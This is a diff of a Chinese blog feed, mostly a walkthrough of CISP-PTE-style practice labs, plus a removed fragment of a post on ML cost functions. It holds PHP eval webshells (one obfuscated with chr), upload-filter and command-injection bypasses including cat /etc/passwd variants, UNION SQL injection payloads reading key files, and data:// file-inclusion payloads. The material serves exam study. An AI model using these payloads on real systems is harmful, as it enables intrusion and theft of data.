+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">绕过</span><br><span class="line"></span><br><span class="line">Oct <span class="number">8</span>进制</span><br><span class="line"></span><br><span class="line">$(printf <span class="string">&quot;\154\163&quot;</span>)<span class="regexp">//</span>ls命令</span><br><span class="line"></span><br><span class="line">拼接绕过</span><br><span class="line"></span><br><span class="line">(sy.(st).em)(whoami);<span class="regexp">//</span></span><br><span class="line"></span><br><span class="line">c<span class="string">&#x27;&#x27;</span>a<span class="string">&#x27;&#x27;</span>t <span class="regexp">/etc/</span>passwd<span class="regexp">//</span>单引</span><br><span class="line"></span><br><span class="line">c<span class="string">&quot;&quot;</span>a<span class="string">&quot;&quot;</span>t <span class="regexp">/etc/</span>passwd<span class="regexp">//</span>双引</span><br><span class="line"></span><br><span class="line">c``a``t <span class="regexp">/etc/</span>passwd/反单引</span><br><span class="line"></span><br><span class="line">c\a\t <span class="regexp">/etc/</span>passwd<span class="regexp">//</span>反斜线</span><br><span class="line"></span><br><span class="line">wh<span class="variable">$1oami</span></span><br><span class="line"></span><br><span class="line">who<span class="variable">$@ami</span></span><br><span class="line"></span><br><span class="line">whoa$*mi</span><br><span class="line"></span><br><span class="line">system<span class="regexp">/*123*/</span>(whoami);</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="3401X"><a href="#3401X" class="headerlink" title="3401X"></a>3401X</h1><h2 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="http-11-1-10-11-34011"><a href="#http-11-1-10-11-34011" class="headerlink" title="http://11.1.10.11:34011"></a><a href="http://11.1.10.11:34011/">http://11.1.10.11:34011</a></h3><p>跑SQLmap，没办法</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250307162443419.png" alt="image-20250307162443329"></p>
+<h2 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="http-11-1-10-11-34012"><a href="#http-11-1-10-11-34012" class="headerlink" title="http://11.1.10.11:34012"></a><a href="http://11.1.10.11:34012/">http://11.1.10.11:34012</a></h3><p>拼接图片马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[php]</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">EvAl</span>(<span class="variable">$_POST</span>[<span class="number">123</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//或者chr绕过恶意函数检测</span></span><br><span class="line"><span class="meta">&lt;?php</span> (@<span class="title function_ invoke__">chr</span>(<span class="number">101</span>).<span class="title function_ invoke__">chr</span>(<span class="number">118</span>).<span class="title function_ invoke__">chr</span>(<span class="number">97</span>).<span class="title function_ invoke__">chr</span>(<span class="number">108</span>))(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>copy 1.jpg &#x2F;b + 1.php shell.jpg</p>
+<blockquote>
+<p><em><strong>绕过：</strong></em></p>
+<p><strong>php后缀绕过</strong></p>
+<p>php &#x2F; php5 &#x2F; pht &#x2F; phtml &#x2F; shtml &#x2F; pwml &#x2F; phtm</p>
+<p><strong>控制台看ASCII码</strong></p>
+<p>[…’eval’].map(c &#x3D;&gt; c.charCodeAt(0));</p>
+<p>[101, 118, 97, 108]</p>
+<p><strong>函数名过滤，用chr函数编码或改大小写</strong></p>
+<?php (@chr(101).chr(118).chr(97).chr(108))($_POST['x']);
+
+@EvAL()
+</blockquote>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304115959149.png" alt="image-20250303150505197"></p>
+<h2 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="http-11-1-10-11-34013"><a href="#http-11-1-10-11-34013" class="headerlink" title="http://11.1.10.11:34013"></a><a href="http://11.1.10.11:34013/">http://11.1.10.11:34013</a></h3><p>view.html查看源码，有一个shell，直接连</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304120008589.png" alt="image-20250303152223138"></p>
+<h2 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="http-11-1-10-11-34014"><a href="#http-11-1-10-11-34014" class="headerlink" title="http://11.1.10.11:34014"></a><a href="http://11.1.10.11:34014/">http://11.1.10.11:34014</a></h3><p>grep即可</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304120013891.png" alt="image-20250303132818302"></p>
+<blockquote>
+<p><em><strong>绕过：</strong></em></p>
+<p><strong>Oct 8进制</strong></p>
+<p>$(printf “\154\163”)&#x2F;&#x2F;ls命令</p>
+<p><strong>拼接绕过</strong></p>
+<p>(sy.(st).em)(whoami);&#x2F;&#x2F;</p>
+<p> c’’a’’t &#x2F;etc&#x2F;passwd&#x2F;&#x2F;单引</p>
+<p>c””a””t &#x2F;etc&#x2F;passwd&#x2F;&#x2F;双引</p>
+<p>c<code>a</code>t &#x2F;etc&#x2F;passwd&#x2F;反单引</p>
+<p>c\a\t &#x2F;etc&#x2F;passwd&#x2F;&#x2F;反斜线</p>
+<p>wh$1oami</p>
+<p>who$@ami</p>
+<p>whoa$*mi</p>
+<p>system&#x2F;<em>123</em>&#x2F;(whoami);</p>
+</blockquote>
+<h2 id="验证码爆破"><a href="#验证码爆破" class="headerlink" title="验证码爆破"></a>验证码爆破</h2><h3 id="http-11-1-10-11-34015"><a href="#http-11-1-10-11-34015" class="headerlink" title="http://11.1.10.11:34015"></a><a href="http://11.1.10.11:34015/">http://11.1.10.11:34015</a></h3><p>把认证去掉</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304120020356.png" alt="image-20250303142220109"></p>
+<h1 id="3402X"><a href="#3402X" class="headerlink" title="3402X"></a>3402X</h1><h2 id="SQL注入-2"><a href="#SQL注入-2" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="http-11-1-10-11-34021"><a href="#http-11-1-10-11-34021" class="headerlink" title="http://11.1.10.11:34021"></a><a href="http://11.1.10.11:34021/">http://11.1.10.11:34021</a></h3><p>注册admin’#账户</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250307162538438.png" alt="image-20250307162538355"></p>
+<p>改密码，用admin登录</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250307162603443.png" alt="image-20250307162603357"></p>
+<h2 id="文件上传-2"><a href="#文件上传-2" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="http-11-1-10-11-34022"><a href="#http-11-1-10-11-34022" class="headerlink" title="http://11.1.10.11:34022"></a><a href="http://11.1.10.11:34022/">http://11.1.10.11:34022</a></h3><p>同 <a href="http://11.1.10.11:34012，直接php后缀">http://11.1.10.11:34012，直接php后缀</a></p>
+<h2 id="文件包含-2"><a href="#文件包含-2" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="http-11-1-10-11-34023"><a href="#http-11-1-10-11-34023" class="headerlink" title="http://11.1.10.11:34023"></a><a href="http://11.1.10.11:34023/">http://11.1.10.11:34023</a></h3><p>同 <a href="http://11.1.10.11:34013/">http://11.1.10.11:34013</a></p>
+<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="http-11-1-10-11-34024"><a href="#http-11-1-10-11-34024" class="headerlink" title="http://11.1.10.11:34024"></a><a href="http://11.1.10.11:34024/">http://11.1.10.11:34024</a></h3><p>先筛成功的</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304120026934.png" alt="image-20250303160721185"></p>
+<p>再筛admin，发现后门php，key在里面</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304120034962.png" alt="image-20250303161009903"></p>
+<h2 id="命令执行-2"><a href="#命令执行-2" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="http-11-1-10-11-34025"><a href="#http-11-1-10-11-34025" class="headerlink" title="http://11.1.10.11:34025"></a><a href="http://11.1.10.11:34025/">http://11.1.10.11:34025</a></h3><p>127.0.0.1 | $(printf “\143\141\164\40\56\56\57\153\145\52\56\160\52”)</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304120042278.png" alt="image-20250303161248089"></p>
+<h1 id="3403X"><a href="#3403X" class="headerlink" title="3403X"></a>3403X</h1><h2 id="SQL注入-3"><a href="#SQL注入-3" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="http-11-1-10-11-34031"><a href="#http-11-1-10-11-34031" class="headerlink" title="http://11.1.10.11:34031"></a><a href="http://11.1.10.11:34031/">http://11.1.10.11:34031</a></h3><p>注册admin’#账号，登录进去后重置这个账号的密码，用admin登录</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304120050287.png" alt="image-20250303161735408"></p>
+<h2 id="文件上传-3"><a href="#文件上传-3" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="http-11-1-10-11-34032"><a href="#http-11-1-10-11-34032" class="headerlink" title="http://11.1.10.11:34032"></a><a href="http://11.1.10.11:34032/">http://11.1.10.11:34032</a></h3><p>同 <a href="http://11.1.10.11:34012，直接php后缀">http://11.1.10.11:34012，直接php后缀</a></p>
+<h2 id="文件包含-3"><a href="#文件包含-3" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="http-11-1-10-11-34033"><a href="#http-11-1-10-11-34033" class="headerlink" title="http://11.1.10.11:34033"></a><a href="http://11.1.10.11:34033/">http://11.1.10.11:34033</a></h3><p>同 <a href="http://11.1.10.11:34013/">http://11.1.10.11:34013</a></p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="http-11-1-10-11-34034"><a href="#http-11-1-10-11-34034" class="headerlink" title="http://11.1.10.11:34034"></a><a href="http://11.1.10.11:34034/">http://11.1.10.11:34034</a></h3><p>cmd&#x3D;ls &gt; ls.html</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304120057195.png" alt="image-20250303164357899"></p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304120102716.png" alt="image-20250303164421723"></p>
+<h2 id="命令执行-3"><a href="#命令执行-3" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="http-11-1-10-11-34035"><a href="#http-11-1-10-11-34035" class="headerlink" title="http://11.1.10.11:34035"></a><a href="http://11.1.10.11:34035/">http://11.1.10.11:34035</a></h3><p>127.0.0.1 &amp;&amp; $(printf “\143\141\164\40\56\56\57\153\145\52\56\160\52”)</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304120108509.png" alt="image-20250303164557035"></p>
+<h1 id="3404X"><a href="#3404X" class="headerlink" title="3404X"></a>3404X</h1><h2 id="SQL注入-4"><a href="#SQL注入-4" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="http-11-1-10-11-34041"><a href="#http-11-1-10-11-34041" class="headerlink" title="http://11.1.10.11:34041"></a><a href="http://11.1.10.11:34041/">http://11.1.10.11:34041</a></h3><p>空格被过滤，使用 <code>/**/</code> 替代</p>
+<p>union被屏蔽，双写绕过</p>
+<p>注释符被过滤，使用 <code>;%00</code> 替代</p>
+<p>payload : <code>id=-1&#39;)/**/ununionion/**/select/**/1,load_file(&#39;/tmp/360/key&#39;),3,4;%00</code></p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304120115622.png" alt="image-20250304094722904"></p>
+<h2 id="文件上传-4"><a href="#文件上传-4" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="http-11-1-10-11-34042"><a href="#http-11-1-10-11-34042" class="headerlink" title="http://11.1.10.11:34042"></a><a href="http://11.1.10.11:34042/">http://11.1.10.11:34042</a></h3><p>GIF89a + phtml通杀<br><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304120120713.png" alt="image-20250304095034807"></p>
+<h2 id="文件包含-4"><a href="#文件包含-4" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="http-11-1-10-11-34043"><a href="#http-11-1-10-11-34043" class="headerlink" title="http://11.1.10.11:34043"></a><a href="http://11.1.10.11:34043/">http://11.1.10.11:34043</a></h3><p>能直接执行phpinfo</p>
+<p>payload : <code>file=data://text/plain,&lt;?php highlight_file(&quot;../key.php&quot;);?&gt;</code></p>
+<blockquote>
+<p>查看文件的函数</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line"><span class="number">2</span>.<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line"><span class="number">3</span>.<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)))));</span><br><span class="line"><span class="number">4</span>.<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line"><span class="number">5</span>.<span class="keyword">require</span>(<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line"><span class="number">6</span>.<span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line"><span class="number">7</span>.<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="number">9</span>.<span class="keyword">try</span>&#123;<span class="variable">$dbh</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span>= <span class="literal">null</span>;&#125;<span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();&#125;<span class="keyword">die</span>();</span><br><span class="line"><span class="number">10</span>.<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="number">11</span>.<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));<span class="comment">//file — 把整个文件读入一个数组中</span></span><br><span class="line"><span class="number">12</span>.<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="number">13</span>.通过fopen去读取文件内容</span><br><span class="line"><span class="title function_ invoke__">fread</span>()</span><br><span class="line"><span class="title function_ invoke__">fgets</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetc</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetss</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetcsv</span>()</span><br><span class="line"><span class="title function_ invoke__">gpassthru</span>()</span><br><span class="line">payload:</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;<span class="comment">//一行一行读取</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;<span class="comment">//一个一个字符读取</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$a</span>,<span class="string">&quot;1000&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fpassthru</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">14</span>.非正常读取直接看：</span><br><span class="line"><span class="title function_ invoke__">copy</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>命令执行函数</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.system(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"></span><br><span class="line">2.<span class="built_in">echo</span> `<span class="built_in">ls</span>`;</span><br><span class="line"></span><br><span class="line">3.passthru(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"></span><br><span class="line">4.<span class="built_in">echo</span> <span class="built_in">exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"></span><br><span class="line">5.<span class="built_in">echo</span> shell_exec(<span class="string">&quot;whoami&quot;</span>);//同反引号</span><br></pre></td></tr></table></figure>
+
+<p>绕过</p>
+<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;ls&quot;);<span class="comment">//这里必须是双引号</span></span><br><span class="line"><span class="number">2.8</span>进制</span><br><span class="line"><span class="number">3</span><span class="selector-class">.Unicode</span>方式</span><br><span class="line"></span><br><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line">(sy.(st)<span class="selector-class">.em</span>)(whoami);</span><br><span class="line">(sy.(st)<span class="selector-class">.em</span>)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure>
+
+
+</blockquote>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304121849477.png" alt="image-20250304100501008"></p>
+<h2 id="命令执行-4"><a href="#命令执行-4" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="http-11-1-10-11-34044"><a href="#http-11-1-10-11-34044" class="headerlink" title="http://11.1.10.11:34044"></a><a href="http://11.1.10.11:34044/">http://11.1.10.11:34044</a></h3><p>同 <a href="http://11.1.10.11:34035/">http://11.1.10.11:34035</a></p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304121856291.png" alt="image-20250304101247864"></p>
+<h2 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="http-11-1-10-11-34045"><a href="#http-11-1-10-11-34045" class="headerlink" title="http://11.1.10.11:34045"></a><a href="http://11.1.10.11:34045/">http://11.1.10.11:34045</a></h3><p>先筛 “ 200，再筛攻击ip</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304121902115.png" alt="image-20250304101806191"></p>
+<p>爆破一下密码</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304121910590.png" alt="image-20250304102019698"></p>
+<p><a href="http://11.1.10.11:34051/">http://11.1.10.11:34051</a></p>
+<h2 id="SQL注入-5"><a href="#SQL注入-5" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="http-11-1-10-11-34061"><a href="#http-11-1-10-11-34061" class="headerlink" title="http://11.1.10.11:34061"></a><a href="http://11.1.10.11:34061/">http://11.1.10.11:34061</a></h3><p>同 <a href="http://11.1.10.11:34041/">http://11.1.10.11:34041</a></p>
+<p>payload : <code>id=-1&#39;) ununionion select 1,load_file(&#39;/tmp/360/key&#39;),3,4,5,6,7;%00</code></p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304121917769.png" alt="image-20250304105326948"></p>
+<h1 id="3407X"><a href="#3407X" class="headerlink" title="3407X"></a>3407X</h1><h2 id="SQL注入-6"><a href="#SQL注入-6" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="http-11-1-10-11-34071"><a href="#http-11-1-10-11-34071" class="headerlink" title="http://11.1.10.11:34071"></a><a href="http://11.1.10.11:34071/">http://11.1.10.11:34071</a></h3><p>没过滤，直接注</p>
+<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">[payload]</span><br><span class="line">uuid=-983fd952-df4e-<span class="number">4b63</span>-946f-f2e6bb0327d6&#x27; <span class="built_in">union</span> select <span class="number">1</span>,(SELECT+GROUP_CONCAT(haha+SEPARATOR+<span class="number">0x3c62723e</span>)+FROM+2web.IS_KEY),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304121931082.png" alt="image-20250304110420666"></p>
+<h2 id="文件上传-5"><a href="#文件上传-5" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="http-11-1-10-11-34072"><a href="#http-11-1-10-11-34072" class="headerlink" title="http://11.1.10.11:34072"></a><a href="http://11.1.10.11:34072/">http://11.1.10.11:34072</a></h3><p>通杀法</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304121941087.png" alt="image-20250304111551641"></p>
+<h2 id="文件包含-5"><a href="#文件包含-5" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="http-11-1-10-11-34073"><a href="#http-11-1-10-11-34073" class="headerlink" title="http://11.1.10.11:34073"></a><a href="http://11.1.10.11:34073/">http://11.1.10.11:34073</a></h3><p>通杀，同 <a href="http://11.1.10.11:34043/">http://11.1.10.11:34043</a></p>
+<p><img src="/2025/03/01/PTE/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250304112342694.png" alt="image-20250304112342694"></p>
+<h2 id="命令执行-5"><a href="#命令执行-5" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="http-11-1-10-11-34074"><a href="#http-11-1-10-11-34074" class="headerlink" title="http://11.1.10.11:34074"></a><a href="http://11.1.10.11:34074/">http://11.1.10.11:34074</a></h3><p>payload : <code>str=s:44:&quot;Whatever is worth doing is worth doing well.&quot;;</code></p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304121957944.png" alt="image-20250304112642048"></p>
+<h2 id="失效的访问控制"><a href="#失效的访问控制" class="headerlink" title="失效的访问控制"></a>失效的访问控制</h2><h3 id="http-11-1-10-11-34075"><a href="#http-11-1-10-11-34075" class="headerlink" title="http://11.1.10.11:34075"></a><a href="http://11.1.10.11:34075/">http://11.1.10.11:34075</a></h3><p>只允许本地访问，添加X-Forwarded-For头</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304194647212.png" alt="image-20250304194646986"></p>
+<p>username改admin，IsAdmin改true</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304194833463.png" alt="image-20250304194833260"></p>
+<h1 id="342XX"><a href="#342XX" class="headerlink" title="342XX"></a>342XX</h1><h2 id="SQL注入-7"><a href="#SQL注入-7" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="http-11-1-10-11-34211"><a href="#http-11-1-10-11-34211" class="headerlink" title="http://11.1.10.11:34211"></a><a href="http://11.1.10.11:34211/">http://11.1.10.11:34211</a></h3><h2 id="文件上传-6"><a href="#文件上传-6" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="http-11-1-10-11-34212"><a href="#http-11-1-10-11-34212" class="headerlink" title="http://11.1.10.11:34212"></a><a href="http://11.1.10.11:34212/">http://11.1.10.11:34212</a></h3><p>通杀法</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304200053067.png"></p>
+<p>上传后的路径需要扫目录</p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304195933008.png" alt="image-20250304195932810"></p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="http-11-1-10-11-34213"><a href="#http-11-1-10-11-34213" class="headerlink" title="http://11.1.10.11:34213"></a><a href="http://11.1.10.11:34213/">http://11.1.10.11:34213</a></h3><h2 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="http-11-1-10-11-34214"><a href="#http-11-1-10-11-34214" class="headerlink" title="http://11.1.10.11:34214"></a><a href="http://11.1.10.11:34214/">http://11.1.10.11:34214</a></h3><p>payload : <code>w=&#123;&quot;bar1&quot;:&quot;2021x&quot;,&quot;bar2&quot;:[[0],1,2,3,4],&quot;bar3&quot;:[&quot;cisp-pte&quot;]&#125;</code></p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304171748991.png" alt="image-20250304171748801"></p>
+<h2 id="文件包含-6"><a href="#文件包含-6" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="http-11-1-10-11-34223"><a href="#http-11-1-10-11-34223" class="headerlink" title="http://11.1.10.11:34223"></a><a href="http://11.1.10.11:34223/">http://11.1.10.11:34223</a></h3><p>通杀，同 <a href="http://11.1.10.11:34043/">http://11.1.10.11:34043</a></p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304164930065.png" alt="image-20250304164929872"></p>
+<h2 id="XSS-1"><a href="#XSS-1" class="headerlink" title="XSS"></a>XSS</h2><h3 id="http-11-1-10-11-34224"><a href="#http-11-1-10-11-34224" class="headerlink" title="http://11.1.10.11:34224"></a><a href="http://11.1.10.11:34224/">http://11.1.10.11:34224</a></h3><h2 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="http-11-1-10-11-34234"><a href="#http-11-1-10-11-34234" class="headerlink" title="http://11.1.10.11:34234"></a><a href="http://11.1.10.11:34234/">http://11.1.10.11:34234</a></h3><p>用2个php函数</p>
+<p>file_put_contents(a,b) : 将b放到a里面</p>
+<p>file_get_contents(b) : 获取b的内容</p>
+<p>payload : <code>$&#123;file_put_contents(&quot;readable.txt&quot;,file_get_contents(&quot;key4.php&quot;))&#125;</code></p>
+<p>更简单的方法 :</p>
+<p>payload : <code>$&#123;copy(&quot;key4.php&quot;,&quot;1.txt&quot;)&#125;</code></p>
+<p><img src="https://raw.gitmirror.com/Cey1anze/Blog_Images/main/pic/20250304161826262.png" alt="image-20250304161826062"></p>
+</blockquote>]]></content>
   </entry>
   <entry>
     <title>SQL注入实战之DVWA</title>
@@ -611,49 +759,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>代价函数</title>
-    <url>/2022/10/11/%E4%BB%A3%E4%BB%B7%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/ApplicationFrameHost_Gvqy4wLebk.png"></p>
-<blockquote>
-<p>代价函数（Cost Function）在机器学习中的每一种算法中都很重要，因为训练模型的过程就是优化代价函数的过程，代价函数对每个参数的偏导数就是梯度下降中提到的梯度，防止过拟合时添加的正则化项也是加在代价函数后面的</p>
-</blockquote>
-<div>
-<h1><font color="CadetBlue">1.什么是代价函数</font>
-</h1>
-</div>
-
-<p>        概况来讲，任何能够衡量模型预测出来的值h(θ)与真实值y之间的差异的函数都可以叫做代价函数J(θ)。</p>
-<p>        代价函数就是用于找到最优解的目的函数，这也是代价函数的作用。</p>
-<p>　　<strong><mark>损失函数（Loss Function ）</mark></strong> 是定义在单个样本上的，算的是一个样本的误差。</p>
-<p>　　<strong><mark>代价函数（Cost Function ）</mark></strong> 是定义在整个训练集上的，是所有样本误差的平均，也就是损失函数的平均。</p>
-<p>　　<strong><mark>目标函数（Object Function）</mark></strong> 定义为：最终需要优化的函数。等于经验风险+结构风险（也就是Cost Function + 正则化项）。</p>
-<div>
-<h1><font color="CadetBlue">2.代价函数的作用是什么</font>
-</h1>
-</div>
-
-<p>        假设，给定一个关于 <code>x</code>  和 <code>y</code>  的数据集，该数据集可以被认定为一个线性回归模型，设定假象函数 : <font color="DeepSkyBlue">f<sub>w,b</sub></font> (x) &#x3D; <font color="DeepSkyBlue">w</font>x + <font color="DeepSkyBlue">b</font> </p>
